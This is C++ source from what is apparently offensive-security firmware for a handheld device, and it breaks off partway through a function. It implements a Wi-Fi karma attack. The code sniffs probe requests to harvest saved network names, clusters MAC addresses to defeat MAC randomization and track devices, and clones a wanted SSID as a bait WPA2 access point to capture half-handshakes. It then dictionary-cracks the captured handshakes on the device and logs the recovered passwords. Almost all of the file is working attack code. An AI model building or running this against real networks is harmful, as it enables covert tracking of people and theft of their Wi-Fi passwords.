// T-REX — offensive security firmware for LilyGo T-Deck
// SPDX-License-Identifier: AGPL-3.0-or-later
// Copyright (C) 2026 Abdallah Natsheh
//
// karma / km — Phase 1: probe-request harvest + live network table.
//
// Clients constantly broadcast directed probe requests for the networks in their
// saved list (PNL). We sniff those in promiscuous mode (MGMT filter), parse the
// SA (probing STA) + requested SSID, and aggregate into two tables:
//   - per (MAC,SSID) records  → foundation for PNL fingerprinting (Phase 2)
//   - per SSID network rows    → live "who wants what" view shown here
//
// Fully headless: harvest lives in PSRAM only, no SD/GPS required (those are
// enrichment in later phases). See .claude/memory project_karma_plan.

#include "karma.h"
#include "display_manager.h"
#include "input_handling.h"
#include "lockscreen_manager.h"
#include "oui_lookup.h"
#include "sdcard_manager.h"
#include "dot11.h"            // shared 802.11 parse (SSID IE, EAPOL)
#include "pcap_writer.h"      // shared libpcap writer
#include "captive_portal.h"  // shared open/WPA2 portal + cred capture
#include "wpa_crack.h"        // shared PBKDF2 / handshake-MIC dictionary crack
#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_heap_caps.h>
#include <SD.h>
#include <string.h>
#include <strings.h>   // strcasecmp

extern DisplayManager displayManager;
extern InputHandling  inputHandler;
extern SDCardManager  sdCardManager;

// ── capacities ────────────────────────────────────────────────────────────────
#define KM_RING       48     // ISR→main lock-free ring (internal DRAM)
#define KM_PROBE_MAX 256     // unique (MAC,SSID) records (PSRAM)
#define KM_NET_MAX   128     // unique SSID rows (PSRAM)
#define KM_RPP         7     // network table rows per page
#define KM_MAC_MAX   128     // distinct probing MACs (fingerprint pass)
#define KM_PNL_MAX    16     // SSIDs tracked per MAC / per device
#define KM_DEV_MAX    64     // clustered physical devices
#define KM_DEV_RPP     5     // device table rows per page
#define KM_DISTINCT    4     // SSID is "distinctive" if wanted by <= this many MACs

enum KmView { VIEW_NETS = 0, VIEW_DEVS = 1 };

// ── ISR ring entry (DRAM — never PSRAM, written from the promiscuous cb) ───────
struct KmRing { uint8_t mac[6]; char ssid[33]; int8_t rssi; uint8_t ch; };
static volatile KmRing s_ring[KM_RING];
static volatile uint8_t s_head = 0, s_tail = 0;

// ── aggregated tables (PSRAM, drained/owned by main loop) ──────────────────────
struct KmProbeRec { uint8_t mac[6]; char ssid[33]; uint16_t hits; int8_t rssi;
                    uint32_t firstMs, lastMs; uint8_t ch; };
struct KmNet      { char ssid[33]; uint16_t devs; uint32_t hits; int8_t rssi; uint8_t ch; };

static KmProbeRec* s_recs = nullptr;
static KmNet*      s_nets = nullptr;
static int         s_recCount = 0, s_netCount = 0;
static uint32_t    s_totalProbes = 0;

// ── fingerprint tables (PSRAM, rebuilt from s_recs on demand) ──────────────────
// PNL = a device's Preferred Network List. pnl[] holds indices into s_nets.
struct KmMac    { uint8_t mac[6]; uint16_t pnl[KM_PNL_MAX]; uint8_t pnlCount;
                  int8_t rssi; uint32_t lastMs; };
struct KmDevice { uint8_t rep[6]; uint8_t macCount; uint16_t pnl[KM_PNL_MAX]; uint8_t pnlCount;
                  const char* vendor; const char* type; bool randomized; bool hasReal;
                  int8_t rssi; uint32_t lastMs; };

static KmMac*    s_macs = nullptr;
static KmDevice* s_devs = nullptr;
static int       s_macCount = 0, s_devCount = 0;

// ── promiscuous probe-request callback ─────────────────────────────────────────
static void IRAM_ATTR karmaRxCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (t != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 24) return;
    const uint8_t* d = p->payload;

    if (dot11::fType(d) != 0 || dot11::fSubtype(d) != dot11::ST_PROBE_REQ) return;
    if (d[10] & 0x01) return;            // multicast/broadcast SA → skip

    char ssid[33];
    if (dot11::extractSSID(d, len, dot11::ST_PROBE_REQ, ssid, sizeof(ssid)) == 0) return; // wildcard

    uint8_t next = (s_head + 1) % KM_RING;
    if (next == s_tail) return;          // ring full — drop
    KmRing& e = (KmRing&)s_ring[s_head];
    memcpy(e.mac, d + 10, 6);
    strncpy(e.ssid, ssid, sizeof(e.ssid) - 1); e.ssid[sizeof(e.ssid) - 1] = '\0';
    e.rssi = p->rx_ctrl.rssi;
    e.ch   = p->rx_ctrl.channel;
    s_head = next;
}

// ── ingest one harvested probe into the aggregated tables ──────────────────────
static void ingest(const KmRing& e) {
    uint32_t now = millis();
    s_totalProbes++;

    // per (MAC,SSID) record
    int rec = -1;
    for (int i = 0; i < s_recCount; i++)
        if (memcmp(s_recs[i].mac, e.mac, 6) == 0 && strcmp(s_recs[i].ssid, e.ssid) == 0) { rec = i; break; }
    bool added = false;
    if (rec < 0 && s_recCount < KM_PROBE_MAX) {
        rec = s_recCount++;
        KmProbeRec& r = s_recs[rec];
        memcpy(r.mac, e.mac, 6);
        strncpy(r.ssid, e.ssid, 32); r.ssid[32] = '\0';
        r.hits = 0; r.firstMs = now; r.ch = e.ch;
        added = true;
    }
    if (rec >= 0) {
        KmProbeRec& r = s_recs[rec];
        r.hits++; r.rssi = e.rssi; r.lastMs = now; r.ch = e.ch;
    }

    // per SSID network row
    int net = -1;
    for (int i = 0; i < s_netCount; i++)
        if (strcmp(s_nets[i].ssid, e.ssid) == 0) { net = i; break; }
    if (net < 0 && s_netCount < KM_NET_MAX) {
        net = s_netCount++;
        KmNet& n = s_nets[net];
        strncpy(n.ssid, e.ssid, 32); n.ssid[32] = '\0';
        n.devs = 0; n.hits = 0;
    }
    if (net >= 0) {
        KmNet& n = s_nets[net];
        n.hits++; n.rssi = e.rssi; n.ch = e.ch;
        if (added) n.devs++;             // a new device now wants this SSID
    }
}

static void drainRing() {
    while (s_tail != s_head) {
        KmRing e;
        memcpy(&e, (const void*)&s_ring[s_tail], sizeof(KmRing));
        s_tail = (s_tail + 1) % KM_RING;
        ingest(e);
    }
}

// ── PNL fingerprinting — cluster MACs into physical devices ────────────────────
// Defeats MAC randomization for devices that leak a multi-SSID PNL from one MAC
// (randomization off, or per-session). Per-network randomization (one stable
// private MAC per saved SSID) can't be PNL-linked → those stay single-MAC devices.
static inline bool laMac(const uint8_t* m) { return (m[0] & 0x02) != 0; }

static int findp(int* parent, int i) {
    while (parent[i] != i) { parent[i] = parent[parent[i]]; i = parent[i]; }
    return i;
}
static void unite(int* parent, int a, int b) {
    int ra = findp(parent, a), rb = findp(parent, b);
    if (ra != rb) parent[ra] = rb;
}

// Two MACs are the same device if they share >=2 distinctive SSIDs, or one's PNL
// is fully contained in the other's and they share >=1 distinctive SSID.
static bool sameDevice(const KmMac& a, const KmMac& b) {
    int shared = 0, sharedDistinct = 0;
    for (int i = 0; i < a.pnlCount; i++)
        for (int j = 0; j < b.pnlCount; j++)
            if (a.pnl[i] == b.pnl[j]) {
                shared++;
                if (s_nets[a.pnl[i]].devs <= KM_DISTINCT) sharedDistinct++;
                break;
            }
    if (sharedDistinct >= 2) return true;
    int smaller = a.pnlCount < b.pnlCount ? a.pnlCount : b.pnlCount;
    return (smaller > 0 && shared == smaller && sharedDistinct >= 1);
}

static void rebuildDevices() {
    // 1. per-MAC PNL from the (MAC,SSID) records
    s_macCount = 0;
    for (int i = 0; i < s_recCount; i++) {
        const KmProbeRec& r = s_recs[i];
        int ni = -1;
        for (int j = 0; j < s_netCount; j++) if (strcmp(s_nets[j].ssid, r.ssid) == 0) { ni = j; break; }
        if (ni < 0) continue;
        int mi = -1;
        for (int j = 0; j < s_macCount; j++) if (memcmp(s_macs[j].mac, r.mac, 6) == 0) { mi = j; break; }
        if (mi < 0) {
            if (s_macCount >= KM_MAC_MAX) continue;
            mi = s_macCount++;
            memcpy(s_macs[mi].mac, r.mac, 6);
            s_macs[mi].pnlCount = 0; s_macs[mi].rssi = r.rssi; s_macs[mi].lastMs = r.lastMs;
        }
        KmMac& m = s_macs[mi];
        bool have = false;
        for (int k = 0; k < m.pnlCount; k++) if (m.pnl[k] == ni) { have = true; break; }
        if (!have && m.pnlCount < KM_PNL_MAX) m.pnl[m.pnlCount++] = (uint16_t)ni;
        if (r.lastMs >= m.lastMs) { m.lastMs = r.lastMs; m.rssi = r.rssi; }
    }

    // 2. union-find over MACs
    static int parent[KM_MAC_MAX];
    for (int i = 0; i < s_macCount; i++) parent[i] = i;
    for (int i = 0; i < s_macCount; i++)
        for (int j = i + 1; j < s_macCount; j++)
            if (sameDevice(s_macs[i], s_macs[j])) unite(parent, i, j);

    // 3. collapse clusters into devices
    static int devOf[KM_MAC_MAX];
    for (int i = 0; i < s_macCount; i++) devOf[i] = -1;
    s_devCount = 0;
    for (int i = 0; i < s_macCount; i++) {
        int root = findp(parent, i);
        int di = devOf[root];
        if (di < 0) {
            if (s_devCount >= KM_DEV_MAX) continue;
            di = s_devCount++;
            devOf[root] = di;
            KmDevice& d = s_devs[di];
            d.macCount = 0; d.pnlCount = 0; d.randomized = false; d.hasReal = false;
            d.vendor = nullptr; d.type = nullptr; d.rssi = -127; d.lastMs = 0;
        }
        KmDevice& d = s_devs[di];
        KmMac&    m = s_macs[i];
        if (d.macCount == 0) memcpy(d.rep, m.mac, 6);   // default rep
        d.macCount++;
        for (int k = 0; k < m.pnlCount; k++) {
            bool have = false;
            for (int x = 0; x < d.pnlCount; x++) if (d.pnl[x] == m.pnl[k]) { have = true; break; }
            if (!have && d.pnlCount < KM_PNL_MAX) d.pnl[d.pnlCount++] = m.pnl[k];
        }
        if (laMac(m.mac)) d.randomized = true;
        else if (!d.hasReal) {                          // prefer a real MAC for vendor + rep
            d.hasReal = true;
            memcpy(d.rep, m.mac, 6);
            OuiInfo oi = ouiLookup(m.mac);
            d.vendor = oi.vendor; d.type = oi.type;
        }
        if (m.lastMs >= d.lastMs) d.lastMs = m.lastMs;
        if (m.rssi > d.rssi)      d.rssi  = m.rssi;
    }

    // 4. vendor fallback for all-random devices (→ "LA-MAC"/"RandMAC")
    for (int i = 0; i < s_devCount; i++)
        if (!s_devs[i].vendor) {
            OuiInfo oi = ouiLookup(s_devs[i].rep);
            s_devs[i].vendor = oi.vendor; s_devs[i].type = oi.type;
        }
}

// ── PSRAM buffers ──────────────────────────────────────────────────────────────
static bool ensureBuffers() {
    if (!s_recs) s_recs = (KmProbeRec*)ps_malloc((size_t)KM_PROBE_MAX * sizeof(KmProbeRec));
    if (!s_nets) s_nets = (KmNet*)ps_malloc((size_t)KM_NET_MAX * sizeof(KmNet));
    if (!s_macs) s_macs = (KmMac*)ps_malloc((size_t)KM_MAC_MAX * sizeof(KmMac));
    if (!s_devs) s_devs = (KmDevice*)ps_malloc((size_t)KM_DEV_MAX * sizeof(KmDevice));
    if (!s_recs || !s_nets || !s_macs || !s_devs) return false;
    s_recCount = s_netCount = s_macCount = s_devCount = 0;
    s_totalProbes = 0;
    s_head = s_tail = 0;
    return true;
}
static void freeBuffers() {
    if (s_recs) { free(s_recs); s_recs = nullptr; }
    if (s_nets) { free(s_nets); s_nets = nullptr; }
    if (s_macs) { free(s_macs); s_macs = nullptr; }
    if (s_devs) { free(s_devs); s_devs = nullptr; }
    s_recCount = s_netCount = s_macCount = s_devCount = 0;
}

// ── harvest promiscuous start/stop (paused around interactive handshake) ───────
static void harvestStart() {
    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karmaRxCb);
}
static void harvestStop() {
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
}

// ── display ─────────────────────────────────────────────────────────────────────
static void drawHeader(const char* noun, int page, int totalPages) {
    DisplayManager& dm = displayManager;
    dm.clearScreen();
    dm.setDefaultTextSize();
    dm.setCursor(4, outputY);
    dm.setTextColor(0x7BEF);    dm.printText("[");
    dm.setTextColor(TFT_CYAN);  dm.printText("KRMA");
    dm.setTextColor(0x7BEF);    dm.printText("::");
    dm.setTextColor(TFT_YELLOW);dm.printText(noun);
    dm.setTextColor(0x7BEF);    dm.printText("]  ");
    char pg[8]; snprintf(pg, sizeof(pg), "%02d/%02d", totalPages ? page + 1 : 0, totalPages);
    dm.setTextColor(0x7BEF);    dm.println(pg);
    dm.printSeparator();
}

// Sort network rows by device-count desc (popularity), then hits.
static void buildOrder(int* idx, int n) {
    for (int i = 0; i < n; i++) idx[i] = i;
    for (int i = 1; i < n; i++) {           // insertion sort (n <= KM_NET_MAX)
        int key = idx[i], j = i - 1;
        while (j >= 0) {
            const KmNet& a = s_nets[idx[j]];
            const KmNet& b = s_nets[key];
            bool less = (a.devs < b.devs) || (a.devs == b.devs && a.hits < b.hits);
            if (!less) break;
            idx[j + 1] = idx[j]; j--;
        }
        idx[j + 1] = key;
    }
}

static void drawNets(uint8_t ch, int page, int sel) {
    DisplayManager& dm = displayManager;
    if (dm.isBlocked()) return;

    int n = s_netCount;
    int totalPages = n ? (n + KM_RPP - 1) / KM_RPP : 1;
    if (page >= totalPages) page = totalPages - 1;

    drawHeader("HARV", page, n ? totalPages : 0);

    // stats line
    dm.setCursor(4, dm.getCursorY());
    char stat[64];
    snprintf(stat, sizeof(stat), "Ch:%-2u  SSIDs:%-3d  Probes:%lu",
             ch, n, (unsigned long)s_totalProbes);
    dm.setTextColor(TFT_GREEN); dm.println(stat);

    // column header
    dm.setCursor(8, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.printText("SSID");
    dm.setCursor(196, dm.getCursorY()); dm.printText("DEV");
    dm.setCursor(232, dm.getCursorY()); dm.printText("HIT");
    dm.setCursor(280, dm.getCursorY()); dm.printText("RSSI");
    dm.println("");
    dm.printSeparator();

    int32_t baseY = dm.getCursorY() + 1;   // fixed-grid rows so highlight aligns
    if (n == 0) {
        dm.setCursor(4, baseY + 4);
        dm.setTextColor(0x7BEF);
        dm.println("Listening for probe requests...");
    } else {
        int order[KM_NET_MAX];
        buildOrder(order, n);
        if (sel >= n) sel = n - 1;
        int start = page * KM_RPP;
        int end   = start + KM_RPP < n ? start + KM_RPP : n;
        for (int i = start; i < end; i++) {
            const KmNet& net = s_nets[order[i]];
            int32_t ry = baseY + (i - start) * LINE_HEIGHT;
            if (i == sel) {
                dm.fillRect(0, ry - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);
                dm.setCursor(0, ry); dm.setTextColor(TFT_YELLOW); dm.printText(">");
            }
            dm.setCursor(8, ry);
            dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            char nm[24]; snprintf(nm, sizeof(nm), "%.21s", net.ssid);
            dm.printText(nm);
            char b[12];
            dm.setCursor(196, ry); dm.setTextColor(TFT_CYAN);
            snprintf(b, sizeof(b), "%u", net.devs); dm.printText(b);
            dm.setCursor(232, ry); dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            snprintf(b, sizeof(b), "%lu", (unsigned long)net.hits); dm.printText(b);
            dm.setCursor(280, ry); dm.setTextColor(0x7BEF);
            snprintf(b, sizeof(b), "%d", net.rssi); dm.printText(b);
        }
    }

    dm.setCursor(0, baseY + KM_RPP * LINE_HEIGHT + 2);
    dm.printSeparator();
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("[h]hs [p]portal [v]devs [q]stop");
}

// Sort devices by PNL size desc (richest fingerprint first), then RSSI.
static void buildDevOrder(int* idx, int n) {
    for (int i = 0; i < n; i++) idx[i] = i;
    for (int i = 1; i < n; i++) {
        int key = idx[i], j = i - 1;
        while (j >= 0) {
            const KmDevice& a = s_devs[idx[j]];
            const KmDevice& b = s_devs[key];
            bool less = (a.pnlCount < b.pnlCount) || (a.pnlCount == b.pnlCount && a.rssi < b.rssi);
            if (!less) break;
            idx[j + 1] = idx[j]; j--;
        }
        idx[j + 1] = key;
    }
}

static void drawDevices(int page, int sel) {
    DisplayManager& dm = displayManager;
    if (dm.isBlocked()) return;

    int n = s_devCount;
    int totalPages = n ? (n + KM_DEV_RPP - 1) / KM_DEV_RPP : 1;
    if (page >= totalPages) page = totalPages - 1;

    drawHeader("DEVS", page, n ? totalPages : 0);

    dm.setCursor(4, dm.getCursorY());
    char stat[64];
    snprintf(stat, sizeof(stat), "Devs:%-3d  MACs:%-3d", n, s_macCount);
    dm.setTextColor(TFT_GREEN); dm.println(stat);

    // column header
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.printText("VENDOR/TYPE");
    dm.setCursor(200, dm.getCursorY()); dm.printText("PNL");
    dm.setCursor(232, dm.getCursorY()); dm.printText("MAC");
    dm.setCursor(280, dm.getCursorY()); dm.printText("RSSI");
    dm.println("");
    dm.printSeparator();

    // Fixed-grid rows: highlight bar pitch == LINE_HEIGHT (println advance is
    // shorter than 14px and would let the bar bleed into the next row).
    int order[KM_DEV_MAX];
    int32_t baseY = dm.getCursorY() + 1;
    if (n == 0) {
        dm.setCursor(4, baseY + 4);
        dm.setTextColor(0x7BEF);
        dm.println("No devices fingerprinted yet.");
    } else {
        buildDevOrder(order, n);
        if (sel >= n) sel = n - 1;
        int start = page * KM_DEV_RPP;
        int end   = start + KM_DEV_RPP < n ? start + KM_DEV_RPP : n;
        for (int i = start; i < end; i++) {
            const KmDevice& d = s_devs[order[i]];
            int32_t ry = baseY + (i - start) * LINE_HEIGHT;
            if (i == sel) {
                dm.fillRect(0, ry - 1, SCREEN_WIDTH, LINE_HEIGHT, 0x0841);  // dark slate-blue (bmon style)
                dm.setCursor(0, ry); dm.setTextColor(TFT_YELLOW); dm.printText(">");
            }
            dm.setCursor(8, ry);
            dm.setTextColor(i == sel ? TFT_YELLOW : TFT_WHITE);
            char vt[28];
            snprintf(vt, sizeof(vt), "%.10s/%.6s",
                     d.vendor ? d.vendor : "?", d.type ? d.type : "?");
            dm.printText(vt);
            char b[12];
            dm.setCursor(200, ry); dm.setTextColor(TFT_CYAN);
            snprintf(b, sizeof(b), "%u", d.pnlCount); dm.printText(b);
            dm.setCursor(232, ry);
            dm.setTextColor(d.macCount > 1 ? TFT_GREEN : 0x7BEF);   // green = MACs collapsed
            snprintf(b, sizeof(b), "%u", d.macCount); dm.printText(b);
            dm.setCursor(280, ry); dm.setTextColor(0x7BEF);
            snprintf(b, sizeof(b), "%d", d.rssi); dm.printText(b);
        }
    }

    // detail pane — selected device's PNL (2 lines), at a fixed Y below the grid
    int32_t paneY = baseY + KM_DEV_RPP * LINE_HEIGHT + 2;
    dm.setCursor(0, paneY);
    dm.printSeparator();
    if (n > 0) {
        buildDevOrder(order, n);
        if (sel >= n) sel = n - 1;
        const KmDevice& d = s_devs[order[sel]];
        char pnl[120]; pnl[0] = '\0';
        for (int k = 0; k < d.pnlCount; k++) {
            const char* nm = (d.pnl[k] < (uint16_t)s_netCount) ? s_nets[d.pnl[k]].ssid : "?";
            size_t cur = strlen(pnl);
            if (cur && cur < sizeof(pnl) - 2) { pnl[cur++] = ','; pnl[cur++] = ' '; pnl[cur] = '\0'; }
            strncat(pnl, nm, sizeof(pnl) - strlen(pnl) - 1);
            if (strlen(pnl) >= sizeof(pnl) - 4) break;
        }
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(0x7BEF); dm.printText("PNL: ");
        dm.setTextColor(TFT_WHITE);
        char l1[44]; snprintf(l1, sizeof(l1), "%.38s", pnl);
        dm.println(l1);
        dm.setCursor(4, dm.getCursorY());
        dm.setTextColor(TFT_WHITE);
        char l2[52]; snprintf(l2, sizeof(l2), "%.50s", strlen(pnl) > 38 ? pnl + 38 : "");
        dm.println(l2);
    }

    dm.printSeparator();
    dm.setCursor(4, dm.getCursorY());
    dm.setTextColor(0x7BEF);
    dm.println("[h]hs [p]portal [v]nets [q]stop");
}

// ════════════════════════════════════════════════════════════════════════════════
// Phase 3 — WPA2 handshake bait (save-only)
// Clone the target SSID as a WPA2 soft-AP with a throwaway PSK. A client that has
// the real network saved auto-joins and sends M1/M2; the M2 MIC is keyed by the
// REAL password (half handshake) → crackable offline. We never finish the handshake
// (wrong PSK, nothing connects); we just sniff our own beacon + the EAPOL frames and
// write an aircrack/hashcat-ready .cap. No deauth, no real AP needed.
// ════════════════════════════════════════════════════════════════════════════════
#define KM_HS_MAX    16      // frames retained (beacon + M1..M4 + a few retries)
#define KM_HS_FRAME 384      // max bytes per frame

struct KmHsFrame { uint16_t len; uint32_t ts; uint8_t data[KM_HS_FRAME]; };
static KmHsFrame*        s_hs = nullptr;       // INTERNAL DRAM — ISR writes, never PSRAM
static volatile int      s_hsCount = 0;
static volatile uint32_t s_hsEapol = 0, s_hsBeacons = 0;
static volatile bool     s_hsCapturing = false, s_hsHaveBeacon = false, s_hsGotM2 = false;
static uint8_t           s_hsBssid[6];         // our soft-AP MAC (capture filter)
static volatile uint8_t  s_hsSta[6];

static void IRAM_ATTR karmaHsCb(void* buf, wifi_promiscuous_pkt_type_t t) {
    if (!s_hsCapturing || s_hsCount >= KM_HS_MAX) return;
    const wifi_promiscuous_pkt_t* p = (const wifi_promiscuous_pkt_t*)buf;
    const uint8_t* d = p->payload;
    uint16_t len = p->rx_ctrl.sig_len;
    if (len < 24) return;
    bool keep = false;

    if (dot11::fType(d) == 0 && dot11::fSubtype(d) == dot11::ST_BEACON) {     // beacon — keep one, ours
        if (!s_hsHaveBeacon && memcmp(d + 16, s_hsBssid, 6) == 0) {
            keep = true; s_hsHaveBeacon = true; s_hsBeacons++;
        }
    } else {                                                                   // data — EAPOL?
        dot11::Eapol ev;
        if (dot11::parseEapol(d, len, ev) && memcmp(dot11::dataBssid(d), s_hsBssid, 6) == 0) {
            keep = true; s_hsEapol++;
            if (ev.msg == 2) { s_hsGotM2 = true; memcpy((void*)s_hsSta, d + 10, 6); }  // M2 = SNonce+MIC
        }
    }
    if (!keep) return;
    int i = s_hsCount;
    if (i >= KM_HS_MAX) return;
    KmHsFrame& f = (KmHsFrame&)s_hs[i];
    uint16_t cl = len < KM_HS_FRAME ? len : KM_HS_FRAME;
    memcpy(f.data, d, cl);
    f.len = cl; f.ts = millis();
    s_hsCount = i + 1;
}

static void sanitizeSsid(const char* ssid, char* out, size_t n) {
    size_t j = 0;
    for (size_t i = 0; ssid[i] && j < n - 1; i++) {
        char c = ssid[i];
        bool ok = (c>='A'&&c<='Z')||(c>='a'&&c<='z')||(c>='0'&&c<='9')||c=='-'||c=='_'||c=='.';
        out[j++] = ok ? c : '_';
    }
    out[j] = '\0';
    if (j == 0) strncpy(out, "ssid", n);
}

// On-device dictionary crack of the captured half-handshake. Extracts M1/M2 crypto
// material from the still-allocated s_hs[] frames, then runs the shared cracker over
// the SD wordlist (/apps/karma/wordlist.txt) and the built-in list. Must be called
// AFTER AP teardown (SD safe) and BEFORE s_hs is freed.
static void karmaCrack(const char* ssid) {
    DisplayManager& dm = displayManager;

    // pull aNonce (M1) + sNonce/MIC/EAPOL (M2) out of the captured frames
    uint8_t aNonce[32], sNonce[32], mic[16], eapol[256];
    uint16_t eapolLen = 0;
    bool haveM1 = false, haveM2 = false;
    for (int i = 0; i < s_hsCount; i++) {
        dot11::Eapol ev;
        if (!dot11::parseEapol(s_hs[i].data, s_hs[i].len, ev)) continue;
        if (ev.msg == 1 && !haveM1 && ev.len >= 49) {
            memcpy(aNonce, ev.p + 17, 32); haveM1 = true;
        } else if (ev.msg == 2 && !haveM2 && ev.len >= 97) {
            uint16_t el = ((ev.p[2] << 8) | ev.p[3]) + 4;
            if (el > ev.len)          el = ev.len;
            if (el > sizeof(eapol))   el = sizeof(eapol);
            memcpy(sNonce, ev.p + 17, 32);
            memcpy(mic,    ev.p + 81, 16);
            memcpy(eapol,  ev.p, el);
            memset(eapol + 81, 0, 16);     // MIC field must be zero for the HMAC
            eapolLen = el; haveM2 = true;
        }
    }

    dm.clearScreen();
    dm.setCursor(4, outputY);
    dm.setTextColor(0x7BEF); dm.printText("[");
    dm.setTextColor(TFT_CYAN); dm.printText("KRMA");
    dm.setTextColor(0x7BEF); dm.printText("::");
    dm.setTextColor(TFT_YELLOW); dm.printText("CRACK");
    dm.setTextColor(0x7BEF); dm.println("]");
    dm.printSeparator();

    if (!haveM1 || !haveM2) {
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(TFT_RED);
        dm.println("Need M1+M2 to crack.");
        return;
    }

    uint8_t apMac[6], staMac[6];
    memcpy(apMac, s_hsBssid, 6);
    memcpy(staMac, (const void*)s_hsSta, 6);

    const mbedtls_md_info_t* sha1 = mbedtls_md_info_from_type(MBEDTLS_MD_SHA1);
    mbedtls_md_context_t ctx; mbedtls_md_init(&ctx); mbedtls_md_setup(&ctx, sha1, 1);

    bool useSD = sdCardManager.canAccessSD() && SD.exists(SD_DIR_KARMA "/wordlist.txt");
    dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x7BEF);
    dm.println(useSD ? "Source: SD wordlist" : "Source: built-in (100)");
    int32_t statY = dm.getCursorY();

    char found[64] = {0};
    uint32_t tried = 0, lastRedraw = 0;
    bool done = false, aborted = false;

    auto status = [&](const char* cand) {
        dm.fillRect(4, statY, SCREEN_WIDTH - 8, LINE_HEIGHT * 2, TFT_BLACK);
        dm.setCursor(4, statY); dm.setTextColor(TFT_WHITE);
        char b[40]; snprintf(b, sizeof(b), "Tried: %lu", (unsigned long)tried); dm.println(b);
        dm.setCursor(4, dm.getCursorY()); dm.setTextColor(0x4208);
        char c[40]; snprintf(c, sizeof(c), "%.30s", cand); dm.println(c);
    };

    // SD wordlist first
    if (useSD) {
        File wl = SD.open(SD_DIR_KARMA "/wordlist.txt", FILE_READ);
        while (wl && wl.available() && !done) {
            String line = wl.readStringUntil('\n'); line.trim();
            if (line.length() < 8) continue;
            tried++;
            uint32_t now = millis();
            if (now - lastRedraw >= 300) {
                lastRedraw = now; status(line.c_str());
                if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
                vTaskDelay(1);
            }
            if (wpacrack::verifyHandshake(line.c_str(), ssid, apMac, staMac, aNonce, sNonce,
                                          eapol, eapolLen, mic, &ctx, sha1)) {
                strncpy(found, line.c_str(), sizeof(found) - 1); done = true;
            }
        }
        if (wl) wl.close();
    }

    // built-in list
    for (int i = 0; i < wpacrack::kBuiltinCount && !done && !aborted; i++) {
        tried++;
        uint32_t now = millis();
        if (now - lastRedraw >= 300) {
            lastRedraw = now; status(wpacrack::kBuiltins[i]);
            if (inputHandler.getKeyboardInput() == 'q') { aborted = true; break; }
            vTaskDelay(1);
        }
        if (wpacrack::verifyHandshake(wpacrack::kBuiltins[i], ssid, apMac, staMac, aNonce, sNonce,
                                      eapol, eapolLen, mic, &ctx, sha1)) {
            strncpy(found, wpacrack::kBuiltins[i], sizeof(found) - 1); done = true;
        }
    }
    mbedtls_md_free(&ctx);

    dm.fillRect(4, statY, SCREEN_WIDTH - 8, LINE_HEIGHT * 3, TFT_BLACK);
    dm.setCursor(4, statY);
    if (done) {
        dm.setTextColor(TFT_GREEN);
        char b[80]; snprintf(b, sizeof(b), "FOUND: %s", found); dm.println(b);
        if (sdCardManager.canAccessSD()) {           // log it (AP already down → GDMA-safe)
            File f = SD.open(SD_DIR_KARMA "/cracked.csv", FILE_APPEND);
            if (f) { f.printf("%s,%s\n", ssid, found); f.close(); }
        }
    } else if (aborted) {
        dm.setTextColor(TFT_YELLOW); dm.println("Aborted.");
    } else {
        dm.setTextColor(TFT_YELLOW); dm.println("Not in wordlist.");
    }
}

// interactive=true → called from the live harvest list: show result, wait for a
// key, and return to the caller (which resumes harvest) instead of the CLI.
static void karmaHandshake(const char* ssid, uint8_t channel, bool interactive) {
    DisplayManager& dm = displayManager;

    // capture buffer in INTERNAL DRAM (the ISR writes into it — must not be PSRAM)
    s_hs = (KmHsFrame*)heap_caps_malloc((size_t)KM_HS_MAX * sizeof(KmHsFrame),
                                        MALLOC_CAP_INTERNAL | MALLOC_CAP_8BIT);
    if (!s_hs) {
        dm.clearScreen(); dm.setCursor(4, outputY); dm.setTextColor(TFT_RED);
        dm.println("Karma: capture buffer alloc failed");
        dm.printCommandScreen(); return;
    }
    s_hsCount = 0; s_hsEapol = 0; s_hsBeacons = 0;
    s_hsHaveBeacon = false; s_hsGotM2 = false; s_hsCapturing = false;
    memset((void*)s_hsSta, 0, 6);

    // open .cap before WiFi (GDMA) — named by SSID (our BSSID isn't known until AP up)
    bool fileOk = false; File cap;
    if (sdCardManager.isReady()) {
        sdCardManager.ensureDir(SD_DIR_KARMA);
        char safe[40]; sanitizeSsid(ssid, safe, sizeof(safe));
        char fname[80]; snprintf(fname, sizeof(fname), SD_DIR_KARMA "/%s.cap", safe);
        cap = SD.open(fname, FILE_WRITE);
        fileOk = (bool)cap;
        if (fileOk) pcap::writeGlobalHeader(cap);
    }

    // WPA2 soft-AP cloning the SSID (throwaway PSK) + promiscuous beacon/EAPOL sniff
    WiFi.disconnect(false);
    WiFi.mode(WIFI_MODE_APSTA);
    WiFi.softAP(ssid, "trexkarma", channel, 0, 4, false);
    delay(150);
    esp_wifi_get_mac(WIFI_IF_AP, s_hsBssid);

    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(karmaHsCb);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    s_hsCapturing = true;

    uint32_t lastDraw = 0;
    bool redraw = true;
    bool crackReq = false;
    while (true) {
        if (LockScreenManager::getInstance().consumeJustUnlocked()) redraw = true;
        uint32_t now = millis();
        if ((redraw || now - lastDraw > 400) && !dm.isBlocked()) {
            drawHeader("WPA2", 0, 0);
